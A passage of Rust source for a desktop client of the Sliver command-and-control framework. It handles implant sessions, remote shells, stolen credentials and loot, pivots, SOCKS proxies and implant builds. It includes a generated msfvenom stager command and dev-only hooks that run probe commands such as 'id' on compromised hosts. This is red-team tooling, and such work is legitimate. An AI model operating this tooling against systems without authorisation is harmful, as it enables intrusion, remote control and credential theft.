                ArmoryMsg::Scan(list) => self.installed_exts = list,
            }
        }
    }

    fn armory_fetch(&mut self, ctx: &egui::Context) {
        if self.armory_busy {
            return;
        }
        self.armory_busy = true;
        self.armory_status = "fetching index…".into();
        let tx = self.armory_tx.clone();
        let ctx = ctx.clone();
        std::thread::spawn(move || {
            let res = armory::fetch_index(armory::DEFAULT_REPO_URL, armory::OFFICIAL_PUBLIC_KEY)
                .map_err(|e| format!("{e:#}"));
            let _ = tx.send(ArmoryMsg::Index(res));
            ctx.request_repaint();
        });
    }

    fn armory_install(&mut self, pkg: Package, ctx: &egui::Context) {
        if self.installing.contains(&pkg.command_name) {
            return;
        }
        self.installing.insert(pkg.command_name.clone());
        let tx = self.armory_tx.clone();
        let ctx = ctx.clone();
        std::thread::spawn(move || {
            let name = pkg.command_name.clone();
            let result = armory::install_extension(&pkg).map(|_| ()).map_err(|e| format!("{e:#}"));
            let _ = tx.send(ArmoryMsg::Installed { name, result });
            ctx.request_repaint();
        });
    }

    fn armory_rescan(&self) {
        let tx = self.armory_tx.clone();
        std::thread::spawn(move || {
            let _ = tx.send(ArmoryMsg::Scan(armory::installed_extensions()));
        });
    }

    fn apply_update(&mut self, u: Update, ctx: &egui::Context) {
        match u {
            Update::Connecting => self.conn = ConnState::Connecting,
            Update::Connected { version } => {
                self.conn = ConnState::Connected;
                self.version = version;
                self.push_event("info", "connected to server");
                self.send(Command::RefreshAll);
                self.send(Command::RefreshLoot);
                self.send(Command::RefreshCreds);
                self.send(Command::RefreshPivots);
                self.send(Command::RefreshWebsites);
                self.ext.server_loading = true;
                for op in [Op::RefreshHosts, Op::RefreshProfiles, Op::RefreshBuilds, Op::RefreshCanaries, Op::RefreshC2Profiles, Op::RefreshOperators, Op::RefreshServerInfo, Op::AiConversations] {
                    self.op(op);
                }
            }
            Update::ConnectError(e) => {
                self.conn = ConnState::Error;
                self.conn_error = e;
                self.handle = None;
            }
            Update::Sessions(s) => {
                for x in &s {
                    self.names.insert(x.id.clone(), x.name.clone());
                }
                self.sessions = s;
            }
            Update::Beacons(b) => {
                for x in &b {
                    self.names.insert(x.id.clone(), x.name.clone());
                }
                self.beacons = b;
            }
            Update::Jobs(j) => self.jobs = j,
            Update::Event(ev) => {
                if !ev.text.is_empty() {
                    self.push_event(&ev.kind, &ev.text);
                }
                self.on_server_event(&ev.kind, &ev.text, ctx);
            }
            Update::Output { target, title, body, ok } => {
                let first = body.lines().map(str::trim).find(|l| !l.is_empty()).unwrap_or("");
                let what = if ok { format!("result: {title}") } else { format!("failed: {title} — {}", elide(first, 160)) };
                self.audit(&self.implant_label(&target), what);
                let c = self.consoles.entry(target).or_default();
                c.lines.push(ConsoleLine::stamped(format!("[*] {title}"), Palette::accent()));
                for line in body.lines() {
                    c.lines.push(ConsoleLine::new(line, if ok { Palette::text() } else { Palette::red() }));
                }
                trim_console(c);
            }
            Update::Running { id, target, label } => {
                if std::env::var("SLIVER_GUI_CONSOLE_RUN").is_ok() { println!("[gui] running '{label}'"); }
                self.ext.running.push((id, target, label, std::time::Instant::now()));
            }
            Update::Finished { id, target, label, cancelled } => {
                self.ext.running.retain(|r| r.0 != id);
                if std::env::var("SLIVER_GUI_CONSOLE_RUN").is_ok() { println!("[gui] finished '{label}' cancelled={cancelled}"); }
                if cancelled {
                    let c = self.consoles.entry(target).or_default();
                    c.push_line(format!("[!] cancelled {label}: stopped waiting (anything it already started on the target keeps running)"), Palette::yellow());
                }
            }
            Update::FileListing { target, listing } => {
                if self.ext.console_ls.remove(&target) {
                    let c = self.consoles.entry(target.clone()).or_default();
                    c.lines.push(ConsoleLine::stamped(format!("[*] ls {}", listing.path), Palette::accent()));
                    if !listing.exists { c.lines.push(ConsoleLine::new("path does not exist", Palette::red())); }
                    let mut files = listing.files.clone();
                    files.sort_by(|a, b| b.is_dir.cmp(&a.is_dir).then(a.name.cmp(&b.name)));
                    for f in files.iter().filter(|f| f.name != "." && f.name != "..") {
                        let size = if f.is_dir { "<dir>".to_string() } else { human_size(f.size) };
                        c.lines.push(ConsoleLine::new(format!("{:<11} {:>10}  {}  {}", f.mode, size, fmt_time(f.mod_time), f.name),
                            if f.is_dir { Palette::accent() } else { Palette::text() }));
                    }
                    trim_console(c);
                }
                let fb = self.files.entry(target).or_default();
                if !listing.path.is_empty() {
                    fb.cwd = listing.path.clone();
                    if listing.exists { fb.visited(&listing.path); }
                }
                fb.listing = Some(listing);
                fb.requested = false;
            }
            Update::Screenshot { target, png } => {
                if png.is_empty() {
                    // Sliver returns a successful but empty response when it
                    // can't capture: no graphical display (headless/SSH session,
                    // a service, a locked console) or an implant built without
                    // screenshot support (e.g. a CGO-disabled Linux cross-build).
                    // This is not a decoding failure.
                    let who = self.display(&self.target_from_key(&target));
                    let msg = "no screenshot returned (no graphical display, or implant lacks screenshot support)";
                    self.set_toast(false, msg);
                    self.push_event("screenshot", &format!("{who} — {msg}"));
                } else if let Some(tex) = decode_png(ctx, &target, &png) {
                    self.textures.insert(target.clone(), tex);
                    self.save_shot(&target, &png);
                    self.pending_open.push(Tab::Screenshot(self.target_from_key(&target)));
                } else {
                    self.set_toast(false, &format!("screenshot: unexpected {}-byte response (not an image)", png.len()));
                }
            }
            Update::ListenerStarted { spec, .. } => {
                let p = preset_of_spec(&spec);
                let key = listener_key(&self.server_key(), p.kind, p.port);
                self.settings.listener_specs.insert(key, p);
                self.settings_dirty = true;
            }
            Update::GenerateDone { name, path, ok, msg } => {
                if std::env::var("SLIVER_GUI_GENPICK").is_ok() { println!("[gui] build {name}: ok={ok} {path} {msg}"); }
                if ok {
                    self.set_toast(true, &format!("built {name} → {path} ({msg})"));
                    self.push_event("info", &format!("implant built: {path}"));
                } else {
                    self.set_toast(false, &format!("build failed: {msg}"));
                }
            }
            Update::BuildReady { name, file_name, data } => self.save_build(&name, &file_name, &data),
            Update::StagedReady { job_id, server_lhost, bind_port, protocol, stager_format, stager_arch, save_dir, stage_bytes } => {
                let proto = match protocol { 1 => "http", 2 => "https", _ => "tcp" };
                // The embedded Sliver Console (real sliver-client) builds the stub via msfvenom.
                let cmd = format!("generate stager --lhost {server_lhost} --lport {bind_port} --protocol {proto} --arch {stager_arch} --format {stager_format} --save {save_dir}");
                self.ext.staged_stager_cmd = Some(cmd);
                self.push_event("info", &format!("stage hosted (job {job_id}, {stage_bytes} bytes) on {proto}/{bind_port} — building the stager in the Sliver Console → {save_dir}"));
                self.set_toast(true, "stage hosted — building the stager in the Sliver Console");
                if let Some(loc) = self.dock.find_tab(&Tab::ServerCli) { self.dock.set_active_tab(loc); }
            }
            Update::Notice { ok, text } => {
                if !ok && self.settings.server_client_log {
                    self.send(Command::ClientLog(format!("{} [error] {text}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S %:z"))));
                }
                self.set_toast(ok, &text);
                self.push_event(if ok { "info" } else { "error" }, &text);
            }
            Update::ShellOpened { target, tunnel_id, pty } => {
                let t = self.target_from_key(&target);
                self.shells.insert(tunnel_id, ShellState::new(t.clone(), tunnel_id, pty));
                self.pending_open.push(Tab::Shell(tunnel_id));
                self.set_toast(true, &format!("shell opened on {}", short(&target)));
            }
            Update::ShellOutput { tunnel_id, data } => {
                if let Some(sh) = self.shells.get_mut(&tunnel_id) {
                    sh.feed(&data);
                }
            }
            Update::ShellClosed { tunnel_id } => {
                if let Some(sh) = self.shells.get_mut(&tunnel_id) {
                    sh.closed = true;
                    sh.feed(b"\r\n[shell closed]\r\n");
                }
            }
            Update::Extensions { target, names } => {
                self.extensions.insert(target, names);
            }
            Update::Loot(v) => self.loot = v,
            Update::Creds(v) => self.creds = v,
            Update::Pivots(g) => self.pivots = Some(g),
            Update::BeaconTasks { beacon_id, tasks } => {
                self.auto_beacon_results(&beacon_id, &tasks);
                self.beacon_tasks.insert(beacon_id, tasks);
            }
            Update::PivotList(list) => self.pivot_list = list,
            Update::Websites(sites) => self.websites = sites,
            Update::Op(u) => self.apply_op(u),
        }
    }

    /// New-callback notifications (toast + window attention).
    fn on_server_event(&mut self, kind: &str, text: &str, ctx: &egui::Context) {
        let fresh = matches!(kind, "session-connected" | "beacon-registered");
        if fresh {
            // A new implant usually means a new host record too.
            self.op(Op::RefreshHosts);
            self.send(Command::RefreshAll);
            if self.settings.notify_callbacks {
                self.set_toast(true, &format!("⚡ {text}"));
            }
            if self.settings.notify_attention {
                ctx.send_viewport_cmd(egui::ViewportCommand::RequestUserAttention(egui::UserAttentionType::Informational));
            }
        }
        if matches!(kind, "canary" | "watchtower") {
            self.set_toast(false, text);
            self.op(Op::RefreshCanaries);
            ctx.send_viewport_cmd(egui::ViewportCommand::RequestUserAttention(egui::UserAttentionType::Critical));
        }
        if matches!(kind, "job-started" | "job-stopped") { self.send(Command::RefreshAll); }
    }

    /// When a beacon console is open, print results for tasks queued since
    /// it opened as they complete.
    fn auto_beacon_results(&mut self, beacon_id: &str, tasks: &[clientpb::BeaconTask]) {
        if self.dock.find_tab(&Tab::Console(Target::beacon(beacon_id))).is_none() { return; }
        let Some(&since) = self.ext.beacon_console_since.get(beacon_id) else { return };
        let seen = self.ext.seen_tasks.entry(beacon_id.to_string()).or_default();
        let fetch: Vec<String> = tasks.iter()
            .filter(|t| t.state == "completed" && t.created_at >= since)
            .filter(|t| seen.insert(t.id.clone()))
            .map(|t| t.id.clone())
            .collect();
        for task_id in fetch {
            self.send(Command::BeaconTaskContent { beacon_id: beacon_id.to_string(), task_id });
        }
    }

    fn target_from_key(&self, key: &str) -> Target {
        if self.sessions.iter().any(|s| s.id == key) {
            Target::session(key)
        } else {
            Target::beacon(key)
        }
    }

    fn push_event(&mut self, kind: &str, text: &str) {
        let now = chrono::Local::now().timestamp();
        self.log_event_line(now, kind, text);
        self.events.push_front((now, kind.to_string(), text.to_string()));
        while self.events.len() > MAX_EVENTS {
            self.events.pop_back();
        }
    }

    /// Show `text` in the status bar while the pointer stays where it is. The bar is
    /// drawn before the tabs, so a new hint asks for one more frame.
    fn hint(&self, ctx: &egui::Context, text: &'static str) {
        if self.shown_hint.get() != Some(text) { ctx.request_repaint(); }
        self.status_hint.set(Some(text));
    }

    /// Errors stay up longer than confirmations (click a toast to dismiss it).
    fn set_toast(&mut self, ok: bool, text: &str) {
        self.toast = Some((if ok { 5.0 } else { 12.0 }, ok, text.to_string()));
    }

    fn open_tab(&mut self, tab: Tab) {
        if let Some(loc) = self.dock.find_tab(&tab) {
            self.dock.set_active_tab(loc);
            return;
        }
        // Interactive tabs (consoles, shells, files, modules, …) should populate
        // the bottom pane, not the top one that holds Sessions + Session Graph.
        if let Some(loc) = self.bottom_anchor() {
            self.dock.set_focused_node_and_surface(loc);
        }
        self.dock.push_to_focused_leaf(tab);
    }

    /// Locate a leaf in the bottom pane to open interactive tabs into. Anchors
    /// on a panel that always lives there; falls back to the focused leaf.
    fn bottom_anchor(&self) -> Option<(egui_dock::SurfaceIndex, NodeIndex)> {
        for anchor in BOTTOM_TABS {
            if let Some((surface, node, _)) = self.dock.find_tab(anchor) {
                return Some((surface, node));
            }
        }
        None
    }
}

/// Dev-only `SLIVER_GUI_TAB` key → bottom-half tab.
fn tab_for_key(key: &str) -> Option<Tab> {
    Some(match key {
        "sessions" | "beacons" | "implants" => Tab::Sessions,
        "jobs" => Tab::Jobs,
        "armory" => Tab::Armory,
        "loot" => Tab::Loot,
        "creds" => Tab::Creds,
        "events" => Tab::Events,
        "pivoting" => Tab::Pivoting,
        "hosting" => Tab::Hosting,
        "console" | "cli" => Tab::ServerCli,
        "local" | "terminal" => Tab::LocalTerm,
        "builds" => Tab::Builds,
        "c2profiles" => Tab::Builds,
        "graph" => Tab::Graph,
        "hosts" => Tab::Hosts,
        "gallery" => Tab::Gallery,
        "server" => Tab::Server,
        _ => return None,
    })
}

/// Repair a serialized layout: panes that were never laid out have NaN
/// rects (saved as JSON null), and a leaf's active index can point past its
/// tabs once per-implant tabs are filtered out.
fn sanitize_dock_json(v: &mut serde_json::Value) {
    use serde_json::Value;
    match v {
        Value::Object(map) => {
            for k in ["x", "y"] {
                if map.get(k).is_some_and(Value::is_null) { map.insert(k.into(), Value::from(0.0)); }
            }
            // Drop tabs removed since the layout was saved (the old separate "Beacons"
            // tab, now merged into Sessions, and the old native "SliverConsole", folded
            // into the sliver-client "Sliver Console" tab) so the layout still loads.
            if let Some(Value::Array(tabs)) = map.get_mut("tabs") {
                tabs.retain(|t| !matches!(t.as_str(), Some("Beacons") | Some("SliverConsole")));
            }
            let ntabs = map.get("tabs").and_then(Value::as_array).map(|t| t.len());
            if let (Some(n), Some(a)) = (ntabs, map.get("active").and_then(Value::as_u64)) {
                if a as usize >= n { map.insert("active".into(), Value::from(0)); }
            }
            for (_, child) in map.iter_mut() { sanitize_dock_json(child); }
        }
        Value::Array(items) => items.iter_mut().for_each(sanitize_dock_json),
        _ => {}
    }
}

/// Restore a saved dock layout: keep only permanent panels, and add any
/// panel the saved layout predates. Returns None if the layout is unusable.
fn restore_dock(mut v: serde_json::Value) -> Option<DockState<Tab>> {
    sanitize_dock_json(&mut v);
    let mut dock: DockState<Tab> = serde_json::from_value(v).ok()?;
    dock.retain_tabs(|t| t.is_permanent());
    if dock.iter_all_tabs().count() == 0 { return None; }
    // Anchor newly-introduced panels next to an existing bottom tab.
    let anchor = BOTTOM_TABS.iter().find_map(|t| dock.find_tab(t)).map(|(s, n, _)| (s, n));
    let order: Vec<&Tab> = TOP_TABS.iter().chain(BOTTOM_TABS.iter()).collect();
    for (k, t) in order.iter().enumerate() {
        if dock.find_tab(t).is_some() { continue; }
        // Right after the panel that precedes it by default, when that's in the layout.
        let prev = k.checked_sub(1).and_then(|p| dock.find_tab(order[p]));
        if let Some((sf, nd, idx)) = prev {
            if let egui_dock::Node::Leaf { tabs, active, .. } = &mut dock[sf][nd] {
                tabs.insert(idx.0 + 1, (*t).clone());
                if active.0 > idx.0 { active.0 += 1; }
                continue;
            }
        }
        if let Some(loc) = anchor { dock.set_focused_node_and_surface(loc); }
        dock.push_to_focused_leaf((*t).clone());
    }
    place_local_terminal(&mut dock);
    Some(dock)
}

fn trim_console(c: &mut ConsoleState) {
    if c.lines.len() > MAX_CONSOLE_LINES {
        let excess = c.lines.len() - MAX_CONSOLE_LINES;
        c.lines.drain(0..excess);
    }
}

fn decode_png(ctx: &egui::Context, key: &str, bytes: &[u8]) -> Option<egui::TextureHandle> {
    let img = image::load_from_memory(bytes).ok()?.to_rgba8();
    let (w, h) = (img.width() as usize, img.height() as usize);
    let color = egui::ColorImage::from_rgba_unmultiplied([w, h], img.as_raw());
    Some(ctx.load_texture(format!("shot-{key}"), color, egui::TextureOptions::LINEAR))
}

fn fmt_age(unix_secs: i64) -> String {
    if unix_secs <= 0 {
        return "—".into();
    }
    let now = chrono::Local::now().timestamp();
    let d = now - unix_secs;
    if d < 0 {
        return "future".into();
    }
    if d < 60 {
        format!("{d}s")
    } else if d < 3600 {
        format!("{}m {}s", d / 60, d % 60)
    } else if d < 86400 {
        format!("{}h {}m", d / 3600, (d % 3600) / 60)
    } else {
        format!("{}d", d / 86400)
    }
}

/// Wall-clock time of a unix timestamp: "13:52:10" today, "Oct 27 13:52" before that.
fn fmt_clock(unix: i64) -> String {
    let Some(t) = chrono::DateTime::from_timestamp(unix, 0).map(|d| d.with_timezone(&chrono::Local)) else { return "—".into() };
    if unix <= 0 { return "—".into(); }
    if t.date_naive() == chrono::Local::now().date_naive() { t.format("%H:%M:%S").to_string() } else { t.format("%b %d %H:%M").to_string() }
}

fn short(id: &str) -> &str {
    id.split('-').next().unwrap_or(id)
}

/// Parse "host:port" (IPv4/hostname). Returns None if malformed.
fn split_host_port(s: &str) -> Option<(String, u32)> {
    let s = s.trim();
    let (host, port) = s.rsplit_once(':')?;
    let port: u32 = port.trim().parse().ok()?;
    let host = host.trim();
    if host.is_empty() || port == 0 || port > 65535 { return None; }
    Some((host.to_string(), port))
}

/// Env-gated scripted pointer input (`SLIVER_GUI_INPUT="<frame>:<m|l|r>:<x>,<y>;…"` —
/// move / left-click / right-click at a frame number) so headless screenshots can show
/// hover menus. A no-op in normal operation.
fn inject_test_input(raw: &mut egui::RawInput) {
    use std::sync::atomic::{AtomicU32, Ordering};
    use std::sync::OnceLock;
    static SCRIPT: OnceLock<Vec<(u32, char, egui::Pos2)>> = OnceLock::new();
    static FRAME: AtomicU32 = AtomicU32::new(0);
    let script = SCRIPT.get_or_init(|| {
        std::env::var("SLIVER_GUI_INPUT").unwrap_or_default().split(';').filter_map(|step| {
            let mut it = step.trim().splitn(3, ':');
            let frame = it.next()?.parse().ok()?;
            let act = it.next()?.chars().next()?;
            let (x, y) = it.next()?.split_once(',')?;
            Some((frame, act, egui::pos2(x.trim().parse().ok()?, y.trim().parse().ok()?)))
        }).collect()
    });
    // SLIVER_GUI_KEYS="<frame>:<text>": type `text` one key per frame from `frame` on,
    // as real key events (`\n` = Enter, `\t` = Tab, `\w` = wait 60 frames), to exercise keyboard paths.
    static KEYS: OnceLock<Option<(u32, Vec<char>)>> = OnceLock::new();
    let keys = KEYS.get_or_init(|| {
        let v = std::env::var("SLIVER_GUI_KEYS").ok()?;
        let (f, text) = v.split_once(':')?;
        Some((f.parse().ok()?, text.replace("\\n", "\n").replace("\\t", "\t").replace("\\w", &"\0".repeat(60)).chars().collect()))
    });
    if script.is_empty() && keys.is_none() { return; }
    let frame = FRAME.fetch_add(1, Ordering::Relaxed);
    if let Some((start, chars)) = keys {
        if let Some(&c) = frame.checked_sub(*start).and_then(|i| chars.get(i as usize)) {
            let key = match c { '\n' => Some(egui::Key::Enter), '\t' => Some(egui::Key::Tab), _ => None };
            match key {
                _ if c == '\0' => {}
                Some(key) => raw.events.push(egui::Event::Key { key, physical_key: None, pressed: true, repeat: false, modifiers: Default::default() }),
                None => raw.events.push(egui::Event::Text(c.to_string())),
            }
        }
    }
    for &(_, act, pos) in script.iter().filter(|s| s.0 == frame) {
        raw.events.push(egui::Event::PointerMoved(pos));
        let button = match act { 'l' => egui::PointerButton::Primary, 'r' => egui::PointerButton::Secondary, _ => continue };
        for pressed in [true, false] {
            raw.events.push(egui::Event::PointerButton { pos, button, pressed, modifiers: Default::default() });
        }
    }
}

impl eframe::App for SliverApp {
    fn raw_input_hook(&mut self, _ctx: &egui::Context, raw_input: &mut egui::RawInput) {
        inject_test_input(raw_input);
    }

    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        // Dev-only: auto-connect to a config named by SLIVER_GUI_AUTOCONNECT
        // (matched against each config's label, or an index) for headless
        // verification against a live server.
        static AUTO: std::sync::Once = std::sync::Once::new();
        AUTO.call_once(|| {
            if let Ok(want) = std::env::var("SLIVER_GUI_AUTOCONNECT") {
                let idx = self.configs.iter().position(|c| c.label() == want)
                    .or_else(|| want.parse::<usize>().ok().filter(|i| *i < self.configs.len()));
                if let Some(i) = idx {
                    self.selected_cfg = i;
                    self.connect(ctx);
                }
            }
        });

        self.drain_updates(ctx);

        // Dev-only: run a session-console line once that session is listed, and
        // cancel it after N seconds (SLIVER_GUI_CONSOLE_RUN=<id prefix>=<line>,
        // SLIVER_GUI_CONSOLE_CANCEL=<secs>).
        if let Ok(spec) = std::env::var("SLIVER_GUI_CONSOLE_RUN") {
            static STARTED: std::sync::OnceLock<(Target, std::time::Instant)> = std::sync::OnceLock::new();
            static CANCELLED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            let (id, line) = spec.split_once('=').unwrap_or((spec.as_str(), ""));
            if STARTED.get().is_none() {
                if let Some((t, label)) = self.find_target(Some(id)) {
                    let _ = STARTED.set((t.clone(), std::time::Instant::now()));
                    println!("[gui] console-run: '{line}' on {label}");
                    self.pending_open.push(Tab::Console(t.clone()));
                    let echo = format!("{} ❯ {line}", self.operator_name());
                    self.consoles.entry(t.key()).or_default().lines.push(ConsoleLine::stamped(echo, Palette::green()));
                    self.dispatch_console(&t, line);
                }
            }
            let secs = std::env::var("SLIVER_GUI_CONSOLE_CANCEL").ok().and_then(|v| v.parse::<u64>().ok());
            if let (Some((t, at)), Some(secs)) = (STARTED.get(), secs) {
                if at.elapsed().as_secs() >= secs && !CANCELLED.load(std::sync::atomic::Ordering::SeqCst) {
                    if let Some(r) = self.ext.running.iter().rev().find(|r| r.1 == t.key()) {
                        CANCELLED.store(true, std::sync::atomic::Ordering::SeqCst);
                        println!("[gui] console-run: cancelling '{}' after {}s", r.2, r.3.elapsed().as_secs());
                        self.send(Command::Cancel { id: r.0 });
                    }
                }
            }
            ctx.request_repaint_after(std::time::Duration::from_millis(250));
        }

        // Dev-only: auto-open a shell on the first session and send a probe
        // command, for headless end-to-end validation of the GUI shell path.
        if std::env::var("SLIVER_GUI_AUTOSHELL").is_ok() {
            static SHELL_SENT: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            static CMD_SENT: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            use std::sync::atomic::Ordering::SeqCst;
            if !SHELL_SENT.load(SeqCst) {
                if let Some(s) = self.sessions.iter().find(|s| !s.is_dead && s.os != "windows") {
                    self.send(Command::OpenShell { target: Target::session(s.id.clone()), pty: false, path: String::new(), rows: 34, cols: 120 });
                    SHELL_SENT.store(true, SeqCst);
                }
            } else if !CMD_SENT.load(SeqCst) {
                if let Some((&tid, sh)) = self.shells.iter().next() {
                    let sid = sh.target.session_id.clone();
                    self.send(Command::ShellInput { tunnel_id: tid, session_id: sid, data: b"echo GUI_SHELL_OK; id\n".to_vec() });
                    CMD_SENT.store(true, SeqCst);
                }
            }
        }

        // Dev-only: queue a beacon task and open the task-history tab.
        if std::env::var("SLIVER_GUI_AUTOBEACON").is_ok() {
            static OPENED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            static FRAME: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            use std::sync::atomic::Ordering::SeqCst;
            if let Some(b) = self.beacons.iter().max_by_key(|b| b.last_checkin).map(|b| b.id.clone()) {
                if !OPENED.swap(true, SeqCst) {
                    self.send(Command::Execute { target: Target::beacon(&b), path: "/usr/bin/id".into(), args: Vec::new() });
                    self.pending_open.push(Tab::BeaconTasks(b.clone()));
                }
                // Periodically refresh so the completed task appears.
                let f = FRAME.fetch_add(1, SeqCst);
                if f % 90 == 0 { self.send(Command::RefreshBeaconTasks { beacon_id: b }); }
            }
        }

        // Dev-only: auto-start a SOCKS proxy / port-forward on the first live session.
        if let Ok(bind) = std::env::var("SLIVER_GUI_AUTOSOCKS") {
            static SENT: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            use std::sync::atomic::Ordering::SeqCst;
            if !SENT.load(SeqCst) {
                if let Some(s) = self.sessions.iter().find(|s| !s.is_dead) {
                    self.send(Command::StartSocks { target: Target::session(s.id.clone()), bind });
                    SENT.store(true, SeqCst);
                }
            }
        }
        if let Ok(spec) = std::env::var("SLIVER_GUI_AUTOPORTFWD") {
            static SENT: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            use std::sync::atomic::Ordering::SeqCst;
            if !SENT.load(SeqCst) {
                if let Some(s) = self.sessions.iter().find(|s| !s.is_dead) {
                    if let Some((bind, rest)) = spec.split_once('=') {
                        if let Some((h, p)) = split_host_port(rest) {
                            self.send(Command::StartPortfwd { target: Target::session(s.id.clone()), bind: bind.into(), remote_host: h, remote_port: p });
                            SENT.store(true, SeqCst);
                        }
                    }
                }
            }
        }

        // Dev-only: open a per-implant view on the first implant whose id or
        // name matches (SLIVER_GUI_OPEN=<procs|files|registry|services|
        // modules|console|tasks>[:<id-prefix or name>]) for headless captures.
        if let Ok(spec) = std::env::var("SLIVER_GUI_OPEN") {
            static OPENED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            use std::sync::atomic::Ordering::SeqCst;
            if !OPENED.load(SeqCst) && self.conn == ConnState::Connected {
                let (view, want) = spec.split_once(':').unwrap_or((spec.as_str(), ""));
                let t = self.sessions.iter().find(|s| want.is_empty() || s.id.starts_with(want) || s.name == want).map(|s| Target::session(&s.id))
                    .or_else(|| self.beacons.iter().find(|b| !want.is_empty() && (b.id.starts_with(want) || b.name == want)).map(|b| Target::beacon(&b.id)));
                if let Some(t) = t {
                    OPENED.store(true, SeqCst);
                    let kind = match view { "procs" => "procs", "files" => "files", "registry" => "registry", "services" => "services",
                        "modules" => "modules", "tasks" => "tasks", "shot" => "shot", "pivot" | "chain" | "wg" => "pivot", "host" => "host", _ => "console" };
                    self.pivot_form.section = match view { "chain" => 1, "wg" => 2, _ => self.pivot_form.section };
                    self.run_actions(vec![(kind, t.clone())]);
                    // SLIVER_GUI_CMD=<console line> runs through the console dispatcher.
                    if let Ok(line) = std::env::var("SLIVER_GUI_CMD") {
                        self.pending_open.push(Tab::Console(t.clone()));
                        if t.is_beacon() {
                            self.ext.beacon_console_since.entry(t.key()).or_insert_with(|| chrono::Local::now().timestamp() - 5);
                        }
                        let me = self.operator_name();
                        for l in line.split(';').map(str::trim).filter(|l| !l.is_empty()) {
                            let c = self.consoles.entry(t.key()).or_default();
                            c.remember(l);
                            c.lines.push(ConsoleLine::stamped(format!("{me} ❯ {l}"), Palette::green()));
                            self.dispatch_console(&t, l);
                        }
                    }
                }
            }
        }

        // Dev-only: open a dialog for capture (SLIVER_GUI_MODAL=generate[:type]|listeners|wglistener|editlistener[:name]|settings|reconfig|confirm),
        // or build through the GUI's own generate path (SLIVER_GUI_GUIGEN=<profile>=<save dir>[=<wg host:port>]).
        if self.conn == ConnState::Connected {
            static MODAL: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            use std::sync::atomic::Ordering::SeqCst;
            if let Ok(m) = std::env::var("SLIVER_GUI_MODAL") {
                if !MODAL.load(SeqCst) && !self.beacons.is_empty() && (!(m.starts_with("editlistener") || m.ends_with(":pick")) || !self.jobs.is_empty()) {
                    MODAL.store(true, SeqCst);
                    match m.as_str() {
                        // generate[:mtls|http|dns|wg|tcp|pipe] opens the generator on that listener type.
                        g if g.starts_with("generate") => {
                            use generator::Transport as T;
                            self.generate_form.transport = match g.split(':').nth(1) {
                                Some("http") => T::Http, Some("dns") => T::Dns, Some("wg") => T::Wg,
                                Some("tcp") => T::TcpPivot, Some("pipe") => T::NamedPipe, _ => T::Mtls,
                            };
                            // generate:<type>:pick also selects the first running listener.
                            if g.ends_with(":pick") {
                                let t = self.generate_form.transport;
                                if let Some((_, v)) = self.listener_choices(t).into_iter().next() { *self.generate_form.addr_mut(t) = v; }
                            }
                            self.show_generate = true;
                        }
                        "listeners" => self.show_listeners = true,
                        "httpslistener" => { let f = &mut self.listener_form; (f.kind, f.port, f.secure, f.tls) = (1, 443, true, 1); self.show_listeners = true; }
                        "wglistener" => { self.listener_form.kind = 4; self.listener_form.port = 51820; self.show_listeners = true; }
                        // editlistener[:<job name>] opens Edit on the first matching job.
                        e if e.starts_with("editlistener") => {
                            let want = e.split(':').nth(1).unwrap_or("");
                            if let Some(j) = self.jobs.iter().find(|j| want.is_empty() || j.name == want).cloned() { self.open_listener_from_job(&j, true); }
                        }
                        "settings" => self.ext.show_settings = true,
                        "reconfig" => { let b = Target::beacon(&self.beacons[0].id); self.run_actions(vec![("reconfig", b)]); }
                        _ => { let s = self.sessions.first().map(|s| Target::session(&s.id)); if let Some(t) = s { self.run_actions(vec![("kill", t)]); } }
                    }
                }
            }
            // Dev-only: build through the generator's listener picker
            // (SLIVER_GUI_GENPICK=<mtls|wg|http|tcp>=<save dir>[=<name>], + _GENPICK_OS, _GENPICK_DEBUG, _GENPICK_OBF, _GENPICK_MATCH=<label part>): first running listener of that type.
            static PICK: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            if let Ok(spec) = std::env::var("SLIVER_GUI_GENPICK") {
                let mut it = spec.splitn(3, '=');
                let (kind, dir, name) = (it.next().unwrap_or("mtls"), it.next().unwrap_or("."), it.next().unwrap_or("gui-pick"));
                use generator::Transport as T;
                let t = match kind { "wg" => T::Wg, "http" => T::Http, "dns" => T::Dns, "tcp" => T::TcpPivot, "pipe" => T::NamedPipe, _ => T::Mtls };
                if t.is_pivot() && !self.ext.gen_pivots_fetched {
                    self.ext.gen_pivots_fetched = true;
                    let ids: Vec<String> = self.sessions.iter().map(|s| s.id.clone()).collect();
                    for id in ids { self.op(Op::PivotListeners { target: Target::session(&id) }); }
                }
                if !PICK.load(SeqCst) {
                    let want = std::env::var("SLIVER_GUI_GENPICK_MATCH").unwrap_or_default();
                    if let Some((label, value)) = self.listener_choices(t).into_iter().find(|(l, _)| l.contains(&want)) {
                        PICK.store(true, SeqCst);
                        let mut f = GenerateForm { transport: t, name: name.to_string(), ..Default::default() };
                        if let Ok(os) = std::env::var("SLIVER_GUI_GENPICK_OS") { f.os = os; }
                        f.debug = std::env::var("SLIVER_GUI_GENPICK_DEBUG").is_ok();
                        f.obfuscate_symbols = std::env::var("SLIVER_GUI_GENPICK_OBF").is_ok();
                        *f.addr_mut(t) = value;
                        let (config, n, _) = build_generate_request(&f);
                        println!("[gui] picked '{label}' → building {} with C2 {:?}", n, config.c2.iter().map(|c| &c.url).collect::<Vec<_>>());
                        self.send(Command::Generate { config, name: n, save_dir: Some(dir.to_string()) });
                    }
                }
            }
            static GEN: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
            if let Ok(spec) = std::env::var("SLIVER_GUI_GUIGEN") {
                let mut it = spec.splitn(3, '=');
                let (name, dir, wg) = (it.next().unwrap_or(""), it.next().unwrap_or("."), it.next());
                if !GEN.load(SeqCst) {
                    if let Some(p) = self.ext.profiles.iter().find(|p| p.name == name).cloned() {
                        GEN.store(true, SeqCst);
